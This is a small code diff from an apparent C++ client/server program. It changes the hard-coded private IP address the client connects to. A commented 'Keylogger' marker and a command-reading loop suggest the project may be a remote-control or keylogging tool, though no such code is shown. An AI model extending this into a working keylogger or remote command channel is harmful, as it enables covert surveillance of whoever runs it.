@@ -32,7 +32,7 @@ int main(int argc, char* argv[]) {
         }
     } else if (argc == 2 && std::string(argv[1]) == "client") {
         // Start client
-        Client client("10.123.1.249", 54000);
+        Client client("192.168.2.253", 54000);
         if (client.connectToServer()) {
             std::string command;
             // // Keylogger
